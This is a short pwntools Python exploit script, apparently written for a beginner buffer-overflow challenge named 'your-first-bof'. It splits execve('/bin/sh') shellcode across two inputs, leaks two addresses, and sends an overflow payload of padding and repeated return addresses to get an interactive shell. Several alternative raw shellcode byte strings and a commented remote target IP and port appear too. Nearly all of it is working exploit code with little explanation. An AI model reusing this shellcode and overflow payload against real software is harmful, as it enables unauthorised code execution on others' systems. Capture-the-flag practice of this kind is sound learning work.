# The first shellcode works (2024-05-15 Wed)

from pwn import *

# context.log_level = 'debug'

p = process('./your-first-bof')
# p = remote('141.164.48.98', '30003')

shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))
# shellcode = b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
# shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
# shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
# shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

p.recvuntil(b':')
addr1 = int(p.recvline(), 16)

p.recvuntil(b':')
addr2 = int(p.recvline(), 16)

p.recvuntil(b'>>>')
p.sendline(shellcode[0:16])

p.recvuntil(b'>>>')
p.sendline(shellcode[16:])
# p.sendline(shellcode[16:32])

print(hex(addr1), '\n', hex(addr2))
print(f'shellcode len: {len(shellcode)}')

addr = addr1
payload = b''
# payload = shellcode[32:]
# payload += b'A' * (0x4 - len(shellcode[32:]))
payload += b'A' * 0x14  # 0x14?
payload += addr.to_bytes(4, 'little')
payload += addr.to_bytes(4, 'little')
payload += addr.to_bytes(4, 'little')
payload += addr.to_bytes(4, 'little')
payload += addr.to_bytes(4, 'little')

p.recvuntil(b':')

pause()
p.sendline(payload)

with open("yfb.txt", "wb") as f:
    f.write(payload)


p.interactive()


# payload = b'B' * (0x30)
# payload +=
